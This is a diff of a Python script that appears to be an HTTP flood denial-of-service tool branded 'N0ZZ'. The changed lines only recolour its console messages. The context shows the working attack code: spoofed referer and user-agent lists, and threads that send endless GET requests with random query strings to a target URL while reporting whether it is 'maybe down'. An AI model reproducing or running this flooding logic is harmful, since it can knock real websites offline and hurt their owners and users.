@@ -58,9 +58,7 @@ referer = [
     "https://alibaba.com/",
     "https://google.com/",
     "https://youtube.com",
-    
-]
-
+    ]
 
 def useragent():
     global headers
@@ -93,11 +91,10 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("[*]  \033[96mN0ZZ --> \033[32m " +str(u)+ "   \033[33mSend the packet  \033[97m " +url+ "\033[0m" )  
-                print("[*]  \033[93mN0ZZ --> \033[37m " +str(u)+ "   \033[35mSend the packet  \033[33m " +url+ "\033[0m" )      
+                print("[*]  \033[31mN0ZZ --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )  
+                print("[*]  \033[31mN0ZZ --> \033[31m " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )      
             except requests.exceptions.ConnectionError:
-                print("[-]  \033[31m--–------------------maybe down--––------––--––-----------\033[0m" )
-                      
+                print("[*]  \033[1mN0ZZ --> \033[1m " +str(u)+ "   \033[97mSend the packet  \033[35m " +url+ "\033[0m" )
                 pass
             except requests.exceptions.InvalidSchema:
                 print ("[URL Error]")
